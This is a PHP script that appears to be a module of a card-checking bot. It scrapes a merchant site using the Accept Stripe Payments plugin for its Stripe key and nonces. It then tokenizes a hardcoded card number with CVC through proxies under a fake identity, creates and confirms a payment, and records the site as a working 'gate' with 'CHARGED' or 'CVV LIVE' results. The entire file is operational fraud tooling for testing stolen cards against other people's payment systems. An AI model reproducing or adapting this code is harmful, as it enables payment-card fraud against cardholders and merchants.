<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$this->sendMsg("[❌] <b>Error</b> → <i>Error Occurred During Gate Adding!</i>\n\n[⚠️] <b>Empty</b> → <i>$empty</i>"); 

	exit;
}

$isRetry = True;

if (!isset($extra) || empty($extra)) {
	$empty = 'Extra is Empty';

	goto start;
}

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$domain = $this->getstr($extra->prod_url, '://', '/');

$r1 = $this->curlx->Get($extra->prod_url, null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$vars = ltrim(trim($this->getstr($this->getstr($r1->body, '/* <![CDATA[ */', '/* ]]> */'), 'vars', ';')), '=');

if (empty($vars)) {
	$empty = 'Variables are Empty';

	goto start;
}

$json_vars = json_decode($vars);

if (!isset($json_vars->stripe_key)) {
	$empty = 'Stripe Key is Empty';

	goto start;
}

$pk = $json_vars->stripe_key;

if (!isset($json_vars->data->product_id, $json_vars->data->currency, $json_vars->ajaxURL, $json_vars->data->button_key, $json_vars->asp_pp_ajax_nonce, $json_vars->asp_pp_ajax_create_pi_nonce)) {
	$empty = 'First Request Tokens are Empty';

	goto start;
}

$product_id = $json_vars->data->product_id;

$currency = $json_vars->data->currency;

$amount = empty($tmp = $json_vars->data->amount) ? $json_vars->minAmounts->$currency : $tmp;

$currencyFormat = $json_vars->currencyFormat;

$asp_amount = round($amount / 100, (empty($tmp = $currencyFormat->c) ? 2 : $tmp));

$sign = empty($tmp = $currencyFormat->s) ? "$" : $tmp;

$charge = $currencyFormat->pos == "right" ? "$asp_amount $sign" : "$sign $asp_amount";

$ajaxURL = $json_vars->ajaxURL;

$button_key = $json_vars->data->button_key;

$userAgent = $this->curlx->userAgent();

$token = md5($userAgent . $button_key);

$asp_pp_ajax_nonce = $json_vars->asp_pp_ajax_nonce;

$asp_pp_ajax_create_pi_nonce = $json_vars->asp_pp_ajax_create_pi_nonce;

$data = 'card[name]='.$fake->first.'+'.$fake->last.'&card[number]=4744770173687345&card[cvc]=376&card[exp_month]=01&card[exp_year]=25&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2F185ad2604%3B+stripe-js-v3%2F185ad2604&time_on_page='.rand(100000, 300000).'&key='.$pk.'&_stripe_version=2020-03-02';

$r2 = $this->curlx->Post('https://api.stripe.com/v1/tokens', $data, null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$json_r2 = json_decode($r2->body);

if (isset($json_r2->error)) {
	$status = $this->response->ErrorHandler($json_r2->error);

	goto end;
}

if (!isset($json_r2->id)) {
	$empty = 'Stripe Token is Empty';

	goto start;
}

$tok = $json_r2->id;

$data = 'action=asp_pp_create_pi&nonce='.$asp_pp_ajax_create_pi_nonce.'&amount='.$amount.'&curr='.$currency.'&product_id='.$product_id.'&quantity=1&billing_details={"name":"'.$fake->first.'%20'.$fake->last.'","email":"'.urlencode($fake->email).'"}&token='.$token;

$headers = [
	"User-Agent: $userAgent"
];

$r3 = $this->curlx->Post($ajaxURL, $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$json_r3 = json_decode($r3->body);

if (!isset($json_r3) || $json_r3->success != 'true') {
	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => 'DEAD - '.($json_r3->err ?? 'Unknown Error').'!'];

	goto end;
}

if (!isset($json_r3->pi_id)) {
	$empty = 'Stripe PI is Empty';

	goto start;
}

$pi_id = $json_r3->pi_id;

$opts = [
	"receipt_email" => $fake->email,
	"payment_method_data" => [
		"type" => "card",
		"card" => [
			"token" => $tok
		]
	]
];

if (isset($json_r3->cust_id)) {
	$opts['save_payment_method'] = true;
	$opts['setup_future_usage'] = 'off_session';
}

$data = 'action=asp_pp_confirm_pi&nonce='.$asp_pp_ajax_nonce.'&product_id='.$product_id.'&pi_id='.$pi_id.'&token='.$token.'&opts='.json_encode($opts).'';

$r4 = $this->curlx->Post($ajaxURL, $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

$json_r4 = json_decode($r4->body);

if (isset($json_r4->err)) {
	$err = trim(str_replace('Stripe API error occurred:', '', $json_r4->err));
} elseif (isset($json_r4->redirect_to)) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => 'CVV LIVE - 3D Redirect Occured!'];

	goto end;
} elseif (isset($json_r4->pi_id)) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => 'CHARGED - Thank for Your Payment!'];

	goto end;
}

$status = $this->response->Stripe($r4->body, $err);

end:

$gate_info = "$name|$type|stripe (asp.net) - $charge|$str|stripe_asp|".json_encode($extra)."";

$this->addGate($gate_info);

$this->sendMsg("[✅] <b>Status</b> → <i>New Stripe Gate has Been Added Successfully!</i>\n\n<b>Domain</b> → <i>".$domain."</i>\n<b>Stripe Key</b> → <i>$pk</i>\n<b>Response</b> → <i>".json_encode($status)."</i>");